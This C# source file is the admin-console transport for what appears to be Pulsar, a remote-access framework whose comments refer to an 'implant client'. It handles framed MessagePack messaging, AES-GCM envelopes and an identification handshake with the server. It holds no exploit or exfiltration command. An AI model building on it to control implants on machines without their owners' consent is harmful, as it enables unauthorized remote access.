using Pulsar.Common.Cryptography;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System.Buffers.Binary;
using System.Collections.Concurrent;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Pulsar.AdminClient;

/// <summary>
/// Minimal Pulsar transport for the admin console: 4-byte little-endian length-prefixed
/// MessagePack frames, optionally wrapped in the AES-256-GCM secure envelope — exactly the
/// same framing and envelope semantics as the implant client (see Pulsar.Client/Networking/Client.cs).
/// DEBUG builds default to plaintext (env-var PULSAR_DEBUG_ENFORCE_ENCRYPTION to force envelopes,
/// mirroring the implant); RELEASE builds REQUIRE a certificate and always encrypt.
/// </summary>
public sealed class AdminConnection : IDisposable
{
    private const int HeaderSize = 4;

    public event Action Disconnected;

    private readonly X509Certificate2 _serverCertificate;
    private readonly bool _encryptTraffic;
    private TcpClient _tcp;
    private NetworkStream _stream;
    private Thread _receiveThread;
    private volatile bool _connected;
    private readonly object _sendLock = new object();

    private readonly ConcurrentDictionary<Type, ConcurrentQueue<TaskCompletionSource<IMessage>>> _waiters = new();

    public bool Connected => _connected;

    public AdminConnection(X509Certificate2 serverCertificate)
    {
        _serverCertificate = serverCertificate;

#if DEBUG
        bool certificateUsable = SecureMessageEnvelopeHelper.CanUse(_serverCertificate);
        string enforceFlag = Environment.GetEnvironmentVariable("PULSAR_DEBUG_ENFORCE_ENCRYPTION");
        bool enforce = !string.IsNullOrWhiteSpace(enforceFlag)
            && (enforceFlag.Equals("1", StringComparison.OrdinalIgnoreCase)
                || enforceFlag.Equals("true", StringComparison.OrdinalIgnoreCase)
                || enforceFlag.Equals("yes", StringComparison.OrdinalIgnoreCase));

        _encryptTraffic = enforce && certificateUsable;
#else
        if (!SecureMessageEnvelopeHelper.CanUse(_serverCertificate))
        {
            throw new InvalidOperationException("A valid server certificate (--cert) is required for secure communication.");
        }
        _encryptTraffic = true;
#endif
    }

    /// <summary>
    /// Connects to the server and starts the receive loop.
    /// </summary>
    public void Connect(string host, ushort port)
    {
        _tcp = new TcpClient();
        _tcp.Connect(host, port);
        _stream = _tcp.GetStream();
        _connected = true;

        _receiveThread = new Thread(ReceiveLoop)
        {
            IsBackground = true,
            Name = "AdminClientReceive"
        };
        _receiveThread.Start();
    }

    /// <summary>
    /// Performs the regular client identification handshake. Returns the identification sent
    /// (useful for the generated Id). Throws TimeoutException if the server does not accept it.
    /// </summary>
    public async Task<ClientIdentification> IdentifyAsync(string tag, string username, string pcName,
        string operatingSystem, string version, TimeSpan timeout)
    {
        byte[] idBytes = RandomNumberGenerator.GetBytes(32);
        byte[] keyBytes = RandomNumberGenerator.GetBytes(32);
        string encryptionKey = Convert.ToBase64String(keyBytes);

        byte[] signature = null;
        using (var rsa = _serverCertificate?.GetRSAPrivateKey())
        {
            if (rsa != null)
            {
                signature = rsa.SignHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(encryptionKey)),
                    HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            }
        }

        var identification = new ClientIdentification
        {
            Version = version,
            OperatingSystem = operatingSystem,
            AccountType = "Admin",
            Country = "-",
            CountryCode = "-",
            ImageIndex = 0,
            Id = Convert.ToHexString(idBytes),
            Username = username,
            PcName = pcName,
            Tag = tag,
            EncryptionKey = encryptionKey,
            Signature = signature,
            PublicIP = "Unknown"
        };

        var pending = WaitForAsync<ClientIdentificationResult>(timeout);
        Send(identification);

        var result = await pending;
        if (result == null || !result.Result)
        {
            throw new TimeoutException("server rejected the identification");
        }

        return identification;
    }

    /// <summary>
    /// Registers a waiter for the next message of the given type. If the timeout elapses first,
    /// the returned task completes with null.
    /// </summary>
    public Task<TMessage> WaitForAsync<TMessage>(TimeSpan timeout) where TMessage : class, IMessage
    {
        var tcs = new TaskCompletionSource<IMessage>(TaskCreationOptions.RunContinuationsAsynchronously);
        var queue = _waiters.GetOrAdd(typeof(TMessage), _ => new ConcurrentQueue<TaskCompletionSource<IMessage>>());
        queue.Enqueue(tcs);

        if (timeout > Timeout.InfiniteTimeSpan && timeout != TimeSpan.Zero)
        {
            _ = Task.Delay(timeout).ContinueWith(_ => tcs.TrySetResult(null), TaskScheduler.Default);
        }

        return tcs.Task.ContinueWith(t => t.Result as TMessage, TaskScheduler.Default);
    }

    /// <summary>
    /// Sends a message to the server.
    /// </summary>
    public void Send<TMessage>(TMessage message) where TMessage : IMessage
    {
        if (!_connected || message == null)
            return;

        lock (_sendLock)
        {
            try
            {
                var prepared = PrepareMessageForSend(message);
                if (prepared == null)
                    return;

                var payload = PulsarMessagePackSerializer.Serialize(prepared);
                var buffer = new byte[HeaderSize + payload.Length];
                BinaryPrimitives.WriteInt32LittleEndian(buffer.AsSpan(0, HeaderSize), payload.Length);
                Buffer.BlockCopy(payload, 0, buffer, HeaderSize, payload.Length);
                _stream?.Write(buffer, 0, buffer.Length);
            }
            catch
            {
                HandleDisconnect();
            }
        }
    }

    private void ReceiveLoop()
    {
        try
        {
            while (_connected)
            {
                var header = ReadExactly(HeaderSize);
                int length = BinaryPrimitives.ReadInt32LittleEndian(header);
                if (length <= 0)
                    throw new InvalidDataException("invalid frame length");

                var payload = ReadExactly(length);
                var message = PulsarMessagePackSerializer.Deserialize(payload);
                message = ProcessIncomingMessage(message);
                if (message == null)
                    continue;

                DispatchWaiters(message);
            }
        }
        catch
        {
            HandleDisconnect();
        }
    }

    private void DispatchWaiters(IMessage message)
    {
        if (_waiters.TryGetValue(message.GetType(), out var queue)
            && queue.TryDequeue(out var waiter))
        {
            waiter.TrySetResult(message);
        }
    }

    private byte[] ReadExactly(int count)
    {
        var buffer = new byte[count];
        int offset = 0;
        while (offset < count)
        {
            int read = _stream.Read(buffer, offset, count - offset);
            if (read <= 0)
                throw new EndOfStreamException();
            offset += read;
        }

        return buffer;
    }

    private IMessage PrepareMessageForSend(IMessage message)
    {
        if (message is SecureMessageEnvelope)
            return message;

        if (!_encryptTraffic)
            return message;

        if (!SecureMessageEnvelopeHelper.CanUse(_serverCertificate))
            throw new InvalidOperationException("Secure transport is enabled but no certificate is available.");

        return SecureMessageEnvelopeHelper.Wrap(message, _serverCertificate);
    }

    private IMessage ProcessIncomingMessage(IMessage message)
    {
        if (message is SecureMessageEnvelope secureEnvelope)
        {
            if (!SecureMessageEnvelopeHelper.CanUse(_serverCertificate))
                throw new InvalidOperationException("Received a secure envelope but no certificate is available.");

            return SecureMessageEnvelopeHelper.Unwrap(secureEnvelope, _serverCertificate);
        }

        if (_encryptTraffic)
            throw new InvalidOperationException($"Received unexpected plaintext message of type {message?.GetType().Name} while encryption is enforced.");

        return message;
    }

    private void HandleDisconnect()
    {
        if (!_connected)
            return;

        _connected = false;

        foreach (var queue in _waiters.Values)
        {
            while (queue.TryDequeue(out var waiter))
            {
                waiter.TrySetResult(null);
            }
        }

        try { _stream?.Close(); } catch { }
        try { _tcp?.Close(); } catch { }

        Disconnected?.Invoke();
    }

    public void Disconnect() => HandleDisconnect();

    public void Dispose()
    {
        HandleDisconnect();
    }
}
